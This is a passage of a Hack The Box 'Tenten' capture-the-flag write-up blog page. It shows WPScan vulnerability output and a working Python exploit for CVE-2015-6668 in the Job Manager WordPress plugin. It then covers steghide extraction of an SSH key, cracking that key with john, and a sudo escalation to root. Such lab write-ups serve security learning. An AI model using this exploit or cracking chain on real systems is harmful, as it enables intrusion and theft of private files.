+  |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
+  |      - https://hackerone.com/reports/339483
+  |
+  | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
+  |     Fixed in: 4.7.15
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9908
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
+  |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+  |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+  |
+  | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
+  |     Fixed in: 4.7.15
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9909
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
+  |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+  |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+  |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
+  |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
+  |
+  | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
+  |     Fixed in: 4.7.15
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9910
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
+  |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+  |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+  |
+  | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
+  |     Fixed in: 4.7.15
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9911
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
+  |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+  |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
+  |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+  |
+  | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation
+  |     Fixed in: 4.7.15
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9912
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
+  |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+  |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
+  |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+  |
+  | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
+  |     Fixed in: 4.7.15
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9913
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
+  |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+  |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
+  |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+  |
+  | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
+  |     Fixed in: 4.7.16
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9973
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
+  |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
+  |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
+  |
+  | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
+  |     Fixed in: 4.7.16
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9975
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
+  |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
+  |      - https://hackerone.com/reports/509930
+  |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
+  |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
+  |
+  | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
+  |     Fixed in: 4.7.16
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9976
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
+  |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
+  |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
+  |
+  | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
+  |     Fixed in: 4.7.16
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/10004
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
+  |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
+  |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
+  |
+  | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
+  |     Fixed in: 4.7.17
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/10201
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
+  |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
+  |      - https://core.trac.wordpress.org/changeset/47634/
+  |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
+  |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
+  |
+  | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
+  |     Fixed in: 4.7.17
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/10202
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
+  |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
+  |      - https://core.trac.wordpress.org/changeset/47635/
+  |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
+  |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
+  |
+  | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
+  |     Fixed in: 4.7.17
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/10203
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
+  |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
+  |      - https://core.trac.wordpress.org/changeset/47633/
+  |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
+  |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
+  |
+  | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
+  |     Fixed in: 4.7.17
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/10205
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
+  |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
+  |      - https://core.trac.wordpress.org/changeset/47637/
+  |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
+  |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
+  |
+  | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
+  |     Fixed in: 4.7.17
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/10206
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
+  |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
+  |      - https://core.trac.wordpress.org/changeset/47638/
+  |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
+  |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
+ 
+ [+] WordPress theme in use: twentyseventeen
+  | Location: http://10.10.10.10/wp-content/themes/twentyseventeen/
+  | Last Updated: 2020-03-31T00:00:00.000Z
+  | Readme: http://10.10.10.10/wp-content/themes/twentyseventeen/README.txt
+  | [!] The version is out of date, the latest version is 2.3
+  | Style URL: http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
+  | Style Name: Twenty Seventeen
+  | Style URI: https://wordpress.org/themes/twentyseventeen/
+  | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+  | Author: the WordPress team
+  | Author URI: https://wordpress.org/
+  |
+  | Found By: Css Style In Homepage (Passive Detection)
+  |
+  | Version: 1.1 (80% confidence)
+  | Found By: Style (Passive Detection)
+  |  - http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'
+ 
+ [+] Enumerating Vulnerable Plugins (via Passive Methods)
+ [+] Checking Plugin Versions (via Passive and Aggressive Methods)
+ 
+ [i] Plugin(s) Identified:
+ 
+ [+] job-manager
+  | Location: http://10.10.10.10/wp-content/plugins/job-manager/
+  | Latest Version: 0.7.25 (up to date)
+  | Last Updated: 2015-08-25T22:44:00.000Z
+  |
+  | Found By: Urls In Homepage (Passive Detection)
+  |
+  | [!] 1 vulnerability identified:
+  |
+  | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8167
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
+  |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
+  |
+  | Version: 7.2.5 (80% confidence)
+  | Found By: Readme - Stable Tag (Aggressive Detection)
+  |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
+ 
+ [+] WPVulnDB API OK
+  | Plan: free
+  | Requests Done (during the scan): 3
+  | Requests Remaining: 47
+ 
+ [+] Finished: Tue May 19 13:43:20 2020
+ [+] Requests Done: 37
+ [+] Cached Requests: 5
+ [+] Data Sent: 8.543 KB
+ [+] Data Received: 350.759 KB
+ [+] Memory used: 174.633 MB
+ [+] Elapsed time: 00:00:20
+ |-------(root@kali)-------|(~/HackTheBox/tenten)
+ |
+ |-->{SFire129}#</figure></pre>
+<p> Was indentified the vulnerability in <code>Job Manager plugin</code><br>
+<img src="/images/hackthebox/exploit/tenten/1.png" alt=""></p>
+<br>
+<p> With the option <code>--enumerate u</code> show the posible users.
+<br>
+<img src="/images/hackthebox/exploit/tenten/10.png" alt=""></p>
+<br>
+<p>When browsing in the web page, found  the folders.<br>
+<img src="/images/hackthebox/exploit/tenten/2.png" alt=""></p>
+<br>
+<img src="/images/hackthebox/exploit/tenten/3.png" alt=""></p>
+<br>
+<p> With the simple script, can enumerate to find another information, but not show aditional data.<br>
+<code>for i in $(seq 1 40); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep 'title'; done </code>
+<img src="/images/hackthebox/exploit/tenten/4.png" alt=""></p>
+<br>
+
+ 
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>
+<p> The version plugin is vulnerable, more information <a class="vglnk" href="https://goo.gl/Vn597m"rel="nofollow"><span> Exploit </span></a>
+<br>
+<pre><figure class="highlight plain">import requests
+
+ print """  
+ CVE-2015-6668  
+ Title: CV filename disclosure on Job-Manager WP Plugin  
+ Author: Evangelos Mourikis  
+ Blog: https://vagmour.eu  
+ Plugin URL: http://www.wp-jobmanager.com  
+ Versions: <=0.7.25  
+ """  
+ website = raw_input('Enter a vulnerable website: ')  
+ filename = raw_input('Enter a file name: ')
+
+ filename2 = filename.replace(" ", "-")
+
+ for year in range(2013,2016):  
+     for i in range(1,13):
+         for extension in {'doc','pdf','docx'}:
+             URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
+             req = requests.get(URL)
+             if req.status_code==200:
+                 print "[+] URL of CV found! " + URL</figure></pre>
+<br>
+<p> Change the extensions files for jpg, jpeg and png.
+<br>
+<img src="/images/hackthebox/exploit/tenten/5.png" alt=""></p>
+<br>
+<p> Run against the target http://10.10.10.10
+<br>
+<img src="/images/hackthebox/exploit/tenten/6.png" alt=""></p>
+<br>
+<p> Found an image vulnerable with possible information, save the image
+<br>
+<img src="/images/hackthebox/exploit/tenten/7.png" alt=""></p>
+<br>
+<p> Running <code>steghide</code> against it with blank password  outputs a private key-file, the key is encrypted.
+
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/tenten)
+|
+|-->{SFire129}#steghide extract -sf HackerAccessGranted.jpg
+Enter passphrase:
+wrote extracted data to "id_rsa".
+|-------(root@kali)-------|(~/HackTheBox/tenten)
+|
+|-->{SFire129}#</figure></pre>
+ 
+<p> The output is in a file id_rsa, with the sshng2john.py change the format for crack with johnTheRipper.
+<br>
+<img src="/images/hackthebox/exploit/tenten/8.png" alt=""><br>
+<img src="/images/hackthebox/exploit/tenten/9.png" alt=""><br>
+<p>Copy the sshng2john result to a file id_rsa_exencrypted and run <code>jonh</code> against it.
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/tenten)
+ |
+ |-->{SFire129}#john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_exencrypted
+ Using default input encoding: UTF-8
+ Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+ Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+ Cost 2 (iteration count) is 1 for all loaded hashes
+ Will run 4 OpenMP threads
+ Note: This format may emit false positives, so it will keep trying even after
+ finding a possible candidate.
+ Press 'q' or Ctrl-C to abort, almost any other key for status
+ <code>superpassword</code>    (id_rsa)
+ 1g 0:00:00:06 37.69% (ETA: 14:25:54) 0.1666g/s 923221p/s 923221c/s 923221C/s mikewaschillin2k8..mikeviskool
+ Warning: Only 2 candidates left, minimum 4 needed for performance.
+ 1g 0:00:00:17 DONE (2020-05-19 14:25) 0.05605g/s 803906p/s 803906c/s 803906C/sa6_123..¡Vamos!
+ Session completed
+ |-------(root@kali)-------|(~/HackTheBox/tenten)
+ |
+ |-->{SFire129}#</figure></pre>
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="headerlink" title="Capture The Flag"></a> Capture The Flag</h2>
+ 
+ <br>
+ <p> With the user <code>takis</code> use ssh a key for connect with the password <code>superpassword</code>.
+ <br>
+ <img src="/images/hackthebox/exploit/tenten/10.png" alt="">
+ <br>
+ <p> Capture the flag user.
+ <br>
+ <pre><figure class="highlight plain">takis@tenten:~$ ls
+ user.txt
+ takis@tenten:~$ cat user.txt
+ ***Here you could be found the flag user***
+ takis@tenten:~$</figure></pre>
+ 
+ 
+ <h2 id="Get-Privileges"><a href="#Get-Privilege" class="headerlink" title="Get Privilege"></a>Get Privileges</h2>
+ <p> With <code>sudo -l</code> show the command allow as a root.
+ <pre><figure class="highlight plain">takis@tenten:~$ sudo -l
+ Matching Defaults entries for takis on tenten:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+ User takis may run the following commands on tenten:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /bin/fuckin
+ takis@tenten:~$ sudo /bin/fuckin bash
+ root@tenten:~# cd /root/
+ root@tenten:/root# ls
+ root.txt
+ root@tenten:/root# cat root.txt
+ ***Here you could be found the root flag***
+root@tenten:/root#4></figure></pre>
+<br>
+<p>
+
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-18</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
